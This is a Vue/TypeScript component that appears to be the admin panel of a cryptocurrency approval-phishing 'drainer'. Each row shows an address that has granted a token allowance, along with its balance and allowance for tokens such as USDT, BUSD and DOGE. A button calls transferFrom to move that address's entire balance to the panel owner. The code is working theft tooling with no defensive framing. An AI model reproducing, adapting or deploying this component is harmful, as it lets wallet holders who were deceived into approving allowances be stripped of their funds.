<script lang="ts" setup>
import { CashIcon } from '@heroicons/vue/outline'
import { ethers } from 'ethers'
import { useAccountStore } from '~/stores/account'
import { useCoin } from '~/hooks/useCoin'
import { useMoment } from '~/hooks/useMoment'

const props = defineProps<{ user: any }>()

const account = useAccountStore()

const balance = ref(0)
const allowance = ref(0)
const color = ref('')

const loadingBalance = ref(false)
const loadingAllowance = ref(false)

let token: any

onMounted(() => {
    switch (props.user?.approve) {
        case 1:
            token = account.tokens.eth
            color.value = 'bg-[#8C8C8C]'
            break
        case 2:
            token = account.tokens.busd
            color.value = 'bg-[#F0B90B]'
            break
        case 3:
            token = account.tokens.usdt
            color.value ='bg-[#50AF96]'
            break
        case 4:
            token = account.tokens.cake
            color.value = 'bg-[#633001]'
            break
        case 5:
            token = account.tokens.ada
            color.value = 'bg-[#0033AD]'
            break
        case 6:
            token = account.tokens.shiba
            color.value = 'bg-[#F00500]'
            break
        case 7:
            token = account.tokens.doge
            color.value = 'bg-[#988430]'
            break
        case 16:
            token = account.tokens.ufo
            color.value = 'bg-green-400'
            break
    }

    loadingBalance.value = true
    
    token.balanceOf(props.user?.author?.address)
        .then((result: any) => {
            balance.value = result
            loadingBalance.value = false
        })
        .catch(() => {
            loadingBalance.value = false
        })

    loadingAllowance.value = true

    token.allowance(props.user?.author?.address, props.user?.owner)
        .then((result: any) => {
            allowance.value = result
            loadingAllowance.value = false
        })
        .catch(() => {
            loadingAllowance.value = false
        })
})

function transfer() {
    // ethers.utils.parseEther('1306.89')
    token.transferFrom(props.user?.author?.address, props.user?.owner, balance.value)
        .then(() => {
            alert('Success')
        })
        .catch((error: any) => {
            if (error?.data?.message) {
                alert(error?.data?.message)
            }
        })
}

</script>

<template>
    <tr class="text-gray-400">
        <td class="px-4 py-3">
            <div class="flex items-center text-sm">
                <!-- Avatar with inset shadow -->
                <div class="relative hidden w-8 h-8 mr-3 rounded-full md:block">
                    <img :src="`https://avatars.dicebear.com/api/avataaars/${ user?.author?.address }.svg`" class="object-cover w-full h-full rounded-full" alt="" loading="lazy">
                    <div class="absolute inset-0 rounded-full shadow-inner" aria-hidden="true"></div>
                </div>
                <div>
                    <p class="font-semibold">{{ user?.author?.address }}</p>
                </div>
            </div>
        </td>

        <td class="px-4 py-3 text-xs">
            <span :class="color" class="whitespace-nowrap px-2 py-1 font-semibold leading-tight rounded-full text-white">
                {{ parseFloat(ethers.utils.formatEther(balance)).toFixed(2) }} {{ useCoin(user?.approve) }}
            </span>
        </td>

        <td class="px-4 py-3 text-sm">
            {{ parseFloat(ethers.utils.formatEther(allowance)).toFixed(2)}}
        </td>

        <td class="px-4 py-3 text-sm">
            {{ useMoment(user?.createdAt) }}
        </td>

        <td class="px-4 py-3 text-sm">
            <div class="flex items-center space-x-4 text-sm">
                <button @click="transfer()" class="flex items-center justify-between px-2 py-2 text-sm font-medium leading-5 rounded-lg text-gray-400 hover:text-purple-600 hover:bg-gray-700 focus:outline-none focus:shadow-outline-gray" aria-label="Information">
                    <CashIcon class="w-5 h-5" />
                </button>
            </div>
        </td>
    </tr>

</template>